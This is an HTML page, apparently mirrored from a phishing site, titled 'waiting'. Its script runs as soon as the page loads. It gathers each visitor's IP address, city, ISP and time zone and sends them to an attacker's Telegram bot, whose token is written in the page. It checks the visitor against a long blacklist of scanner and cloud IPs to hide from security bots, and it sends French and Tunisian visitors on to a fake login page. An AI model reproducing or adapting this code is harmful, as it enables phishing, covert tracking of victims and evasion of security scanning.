<html>
<!--
* PyWebCopy Engine [version 7.0.2]
* Copyright 2020; Raja Tomar
* File mirrored from [https://fr-borsorma-fr.firebaseapp.com/]
* At UTC datetime: [2023-06-24 11:59:27.166324]
--><head>
    <title>waiting</title>
</head>
<body>
<script>

    function getIpAndCountryCode() {
        return new Promise(function (resolve) {
            const xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    const response = JSON.parse(xhr.responseText);
                    resolve({ip: response.ip, city: response.city, region_name: response.region_name, country_code: response.country_code, organisation: response.organisation, time_zone: response.time_zone});
                }
            };
            xhr.open('GET', 'https://ip-api.io/json/', true);
            xhr.send();
        })
    }

    function sendIPToTelegram(ip, city, region_name, country_code, organisation, time_zone) {
        return new Promise(function (resolve) {
            const telegramAPIUrl = 'https://api.telegram.org/bot5812238966:AAFZgHTzE8yweBMxgfFtCCwz0bF9QJ12DzI/sendMessage';

            const message = `IP address lein1: ${ip}\ncity: ${city}\nregion name: ${region_name}\ncountry: ${country_code}\ninternet: ${organisation}\nzone: ${time_zone}`;
            const chatId = '891906517';
            const telegramUrl = `${telegramAPIUrl}?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            const xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    resolve();
                }
            };
            xhr.open('POST', telegramUrl, true);
            xhr.send();
        })

    }

    function checkCountry(countryCode) {
        return new Promise(function (resolve, reject) {
            const allowedCountries = [
                'TN',
                'FR'
            ];

            if (!allowedCountries.includes(countryCode)) {
                // non authoris&#233;
                reject()
            } else {
                // authoris&#233;
                resolve()
            }
        })
    }

    function redirectBasedOnBlacklist(ipAddress) {
        return new Promise((resolve, reject) => {
            const blacklist = [
                '213.218.155.90',
                '212.39.82.0',
                '212.39.86.106',
                '212.21.156.62',
                '212.39.86.102',
                '212.39.86.105',
                '212.39.86.103',
                '212.39.86.100',
                '212.39.82.132',
                '212.39.86.72',
                '212.143.94.254',
				'212.143.94.234',
                '212.143.94.100',

                '185.4.81.133',
                '185.146.147.242',
                '185.4.81.101',
                '185.4.81.102',
                '185.4.81.103',
                '185.4.81.104',
                '185.4.81.105',
                '182.64.43.225',
                '149.62.205.0',
                '149.62.209.65',
                '149.62.208.103',
                '149.62.206.123',
                '107.21.50.136',
                '95.87.249.99',
                '94.156.188.69',
                '85.14.28.197',
                '85.14.28.196',
                '79.132.10.74',
                '78.154.14.34',

                '74.125.113.17',
                '74.125.212.44',
                '68.65.22.170',
                '64.233.172.33',
                '51.107.43.35',
                '51.12.0.79',
                '51.107.101.195',
                '45.124.26.48',

                '40.94.94.33',
                '40.94.90.82',
                '40.94.20.43',
                '40.94.94.86',
                '40.94.101.10',
                '40.94.90.38',
                '40.94.105.44',
                '40.94.239.96',
                '40.94.104.77',
                '40.94.96.91',
                '40.94.101.8',
                '40.94.239.22',
                '40.94.101.45',
                '40.94.96.56',
                '40.94.104.56',
                '40.94.88.46',
                '40.94.95.64',
                '40.94.89.95',
                '40.94.102.96',
                '40.94.33.10',
                '40.94.97.53',
                '40.94.88.50',
                '40.94.94.53',
                '40.94.31.17',
                '40.94.104.76',
                '40.94.30.179',
                '40.94.25.96',
                '40.94.29.15',
                '40.94.97.66',
                '40.94.97.13',
                '40.94.100.5',
                '40.94.35.20',
                '40.86.251.123',
                '40.94.97.95',
                '40.94.239.58',
                '40.94.25.64',
                '40.94.35.84',

                '38.100.114.203',
                '38.100.114.213',
                '23.104.106.99',
                '23.19.224.64',
                '23.99.227.98',

                '20.164.32.4',
                '20.74.54.235',
                '20.203.209.59',
                '20.199.192.219',
                '13.80.183.173',
                '5.199.128.113',
                '4.198.69.64',
                '4.204.198.166',
                '3.213.113.74',

                '223.134.57.191',
                '216.131.114.240',
                '212.102.57.3',
                '209.127.109.147',
                '209.242.219.162',
                '209.126.88.196',
                '207.154.220.242',
                '205.185.222.19',
                '203.25.139.25',
                '203.78.170.33',
                '202.43.234.109',
                '198.244.133.159',
                '198.23.242.150',
                '197.156.143.178',
                '196.203.239.250',
                '196.229.2.77',
                '195.74.76.194',
                '194.163.187.74',
                '192.178.10.99',
                '192.175.111.243',
                '192.42.116.182',
                '192.200.158.221',
                '188.126.89.155',
                '188.42.195.140',
                '185.104.184.218',
                '185.253.96.46',
                '185.194.93.135',
                '185.108.106.202',
                '185.128.178.178',
                '185.108.106.203',
                '185.128.178.210',
                '185.213.155.171',
                '184.188.74.249',
                '184.154.13.122',
                '181.214.167.30',
                '178.212.186.7',
                '178.149.75.19',
                '176.67.82.3',
                '172.121.203.149',
                '172.85.102.9',
                '171.22.229.60',
                '170.246.52.96',
                '168.151.126.168',
                '167.250.109.155',
                '167.88.7.162',
                '167.250.111.226',
                '167.250.111.75',
                '164.90.241.135',
                '162.43.242.41',
                '162.43.249.69',
                '161.129.171.212',
                '159.146.122.238',
                '157.230.94.218',
                '157.245.121.229',
                '157.245.66.143',
                '154.47.20.184',
                '152.39.150.128',
                '146.70.128.42',
                '146.255.187.216',
                '146.190.125.227',
                '146.255.187.184',
                '137.74.81.189',
                '136.0.64.62',
                '134.73.131.244',
                '128.90.177.20',
                '123.221.169.155',
                '119.12.186.87',
                '104.244.74.159',
                '104.198.253.61',
                '104.155.143.40',
                '104.165.1.228',
                '104.171.158.22',
                '104.248.239.115',
                '104.176.0.111',
                '103.14.143.66',
                '102.129.252.48',
                '101.55.184.231',
                '96.32.18.112',
                '95.164.157.53',
                '94.102.49.123',
                '92.222.212.16',
                '91.90.42.154',
                '89.248.171.23',
                '89.208.29.225',
                '84.17.42.10',
                '84.17.42.5',
                '84.17.42.14',
                '84.17.42.9',
                '84.17.42.54',
                '84.17.42.34',
                '81.91.178.56',
                '80.82.70.198',
                '80.211.2.105',
                '80.255.7.107',
                '81.161.59.17',
                '77.158.181.2',
                '75.174.132.124',
                '74.125.210.67',
                '72.17.88.58',
                '70.125.225.198',
                '70.38.27.252',
                '66.102.9.195',
                '66.249.93.40',
                '65.154.226.168',
                '65.108.40.9',
                '64.233.172.35',
                '64.233.172.34',
                '64.57.140.115',
                '64.15.129.102',
                '64.15.129.118',
                '63.33.59.190',
                '54.244.139.126',
                '54.234.109.63',
                '54.208.234.230',
                '54.148.198.69',
                '54.221.115.0',
                '54.197.103.197',
                '54.159.97.178',
                '52.88.88.180',
                '52.177.249.187',
                '52.45.177.84',
                '52.87.44.246',
                '52.36.38.234',
                '52.226.200.119',
                '52.24.67.13',
                '52.32.240.62',
                '52.44.203.21',
                '51.75.5.243',
                '51.75.141.254',
                '51.68.184.196',
                '46.246.122.165',
                '45.158.203.68',
                '46.193.65.105',
                '44.215.68.186',
                '40.94.34.27',
                '40.94.35.35',
                '38.242.227.11',
                '38.242.224.146',
                '38.154.198.179',
                '38.100.114.154',
                '38.100.114.172',
                '37.59.164.106',
                '35.86.169.84',
                '35.193.152.75',
                '35.232.47.94',
                '35.223.155.202',
                '35.89.111.155',
                '35.88.108.30',
                '35.90.52.181',
                '35.232.109.151',
                '35.91.184.177',
                '35.89.193.6',
                '35.166.181.73',
                '35.168.127.2',
                '35.92.115.70',
                '35.188.47.77',
                '35.193.165.168',
                '34.171.33.159',
                '34.123.168.190',
                '34.220.85.9',
                '34.122.13.162',
                '34.27.191.222',
                '34.123.134.98',
                '34.66.255.100',
                '34.29.199.159',
                '34.141.186.225',
                '34.122.186.130',
                '34.28.66.242',
                '34.122.199.121',
                '34.27.80.227',
                '34.170.133.110',
                '34.135.7.197',
                '34.29.227.216',
                '34.241.237.197',
                '34.30.39.217',
                '34.30.39.217',
                '34.123.33.49',
                '34.71.9.82',
                '34.69.140.17',
                '34.133.81.123',
                '27.50.76.169',
                '34.229.213.26',
                '23.228.130.201',
                '23.228.130.196',
                '23.228.130.132',
                '20.163.64.196',
                '20.187.104.244',
                '20.114.22.115',
                '20.241.139.3',
                '20.94.242.109',
                '18.236.161.159',
                '5.181.234.133',
                '5.149.101.196',
                '3.235.170.45',
                '3.226.254.122',
                '3.25.113.140',
                '3.235.185.193',
                '3.21.52.32',
                '3.93.225.44',
                '3.123.16.107',
                '3.217.190.109',
                '3.26.232.74',
                '105.71.16.1'
            ];

            if (blacklist.includes(ipAddress)) {
                // bot
                reject()
            } else {
                // mouch bot
                resolve()
            }
        })

    }

    getIpAndCountryCode().then((rs) => {
        redirectBasedOnBlacklist(rs.ip)
            .then(() => {
                sendIPToTelegram(rs.ip, rs.city, rs.region_name, rs.country_code, rs.organisation, rs.time_zone)
                    .then(() => {
                        checkCountry(rs.country_code)
                            .then(() => {
                                window.location.href = './login.html?xml_id=/fr_FR/Login?ID=972911073';
                            })
                            .catch(() => {
                                window.location.href = 'https://google.com';
                            })
                    })
            })
            .catch(() => {
                window.location.href = 'https://google.com';
            })
    })
</script>
</body>
</html>